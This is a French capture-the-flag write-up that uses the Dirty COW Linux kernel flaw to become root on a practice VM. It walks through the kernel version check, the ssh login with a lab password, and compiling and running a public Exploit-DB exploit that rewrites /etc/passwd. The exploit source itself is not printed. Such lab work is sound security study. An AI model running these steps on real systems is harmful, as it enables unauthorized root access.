# Dirty COW
## Introduction
Dirty COW est le nom donné faille de sécurité du noyau Linux. Elle va nous permettre une élévation de privilèges avec l'exécution d'un programme `C`.

## Compatibilité
Cette faille n'est exploitable qu'avec une version du noyau comprise entre `2.6.22` et `3.9`. On vérifie notre version du noyau avec :
```
> uname -r
3.2.0-91-generic-pae
```
Notre VM est compatible avec cette faille.

## Récupération et exécution du code
La faille étant assez connue, il est possible de récuperer facilement le code à exécuter. Nous utiliserons [celui ci](https://www.exploit-db.com/exploits/40839).

On se connecte en `ssh` à la VM. Tous les utilisateurs dans le sujets sont compatibles avec la faille.
```
> ssh -p 22 zaz@192.168.99.102
646da671ca01bb5d84dbb5fb2238dc8e
```
On créer un fichier `exploit.c` qui contient le code récupéré préalablement. On compile avec `gcc`. Certains flags sont necessaires :
```
gcc exploit.c -lpthread -lcrypt
```
En exécutant le `a.out` :
```
> ./a/out
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
firefart:fiGIOrsN6mdSc:0:0:pwned:/root:/bin/bash

mmap: b7fda000
```

Le programme nous demande un mot de passe, on saisit le mot de passe de notre choix comme `125boot2root`.

Nous pouvons maintenant lancer la commande `su` et rentrer le mot de passe préalablement choisis.

Un `whoami` nous affichera l'utilisateur `firefart`. Son `id` est bien `0`, nous somme donc passé `root`.
```
> whoami
firefart
> id
uid=0(firefart) gid=0(root) groups=0(root)
```

## Comprendre la faille

Lorsqu'on fait un `cat /etc/passwd`, on obtient plusieurs lignes avec les différents users. Par exemple, pour l'utilisateur `lmezard` :
```
> cat /etc/passwd
[...]
lmezard:x:1001:1001:laurie,,,:/home/lmezard:/bin/bash
[...]
```

`1001` est l'identifiant de l'utilisateur `lmezard`. Le `x` indique que son mot de passe est stocké dans un fichier. Lorsqu'on éxécute le script, le `x` va être remplacé par un hash du mot de passe saisis.
